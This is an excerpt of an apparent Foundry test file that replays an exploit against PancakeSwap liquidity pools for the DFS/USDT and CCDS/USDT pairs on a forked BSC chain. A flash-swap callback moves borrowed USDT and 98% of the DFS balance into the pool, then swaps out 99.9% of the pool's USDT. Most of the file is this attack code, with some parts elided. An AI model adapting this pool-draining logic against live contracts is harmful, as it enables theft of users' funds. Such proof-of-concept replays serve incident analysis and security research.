...
IPancakePair constant USDT_CCDS_LP = IPancakePair(
    0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F
);
IPancakePair constant DFS_USDT_LP = IPancakePair(
    0x4B02D85E086809eB7AF4E791103Bc4cde83480D1
);
...
contract Attacker is Test {
    ...
    function setUp() public {
        ...
        vm.label(address(USDT_CCDS_LP), "USDT_CCDS_LP");
        vm.label(address(DFS_USDT_LP), "DFS_USDT_LP");
        vm.label(usdt, "USDT");
        vm.label(dfs, "dfs");
        vm.label(ccds, "ccds");
        vm.createSelectFork("bsc", 24_349_821);
    }
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint(
            ...
            IERC20(usdt).balanceOf(address(exploit)),
            18
        );
        exploit.harvest();
        emit log_named_decimal_uint(
...
contract Exploit is Test {
    ...
    function pancakeCall(
        ...
        emit log_named_decimal_uint(
            "[INFO]  this balance (usdt token)",
            IERC20(usdt).balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[INFO]  this balance (dfs token)",
            IERC20(dfs).balanceOf(address(this)),
            18
        );
        IERC20(usdt).transfer(address(DFS_USDT_LP), borrowamount);

        (uint256 reserve0beforeswap, uint256 reserve1beforeswap, ) = DFS_USDT_LP
            .getReserves();
        ...
        IERC20(dfs).transfer(
            address(DFS_USDT_LP),
            (dfstransferamount * 98) / 100
        ); // transfer  98%  dfs balance
        ...
        emit log_named_decimal_uint(
            "[INFO]  address(this) balance (dfs token)",
            IERC20(dfs).balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[INFO]  address(this) balance (usdt token)",
            IERC20(usdt).balanceOf(address(this)),
            18
        );
        ...
        emit log_named_decimal_uint(
            "[INFO]  address(DFS_USDT_LP) balance (usdt token)",
            dfslpusdtamount,
            18
        );
        DFS_USDT_LP.swap(
            0,
            (dfslpusdtamount * 999) / 1000,
            address(this),
            new bytes(1)
        ); // swap 99.9 lp usdt
        emit log_named_decimal_uint(
            "[INFO] payback amount usdt ",
            IERC20(usdt).balanceOf(address(address(this))),
            18
        );
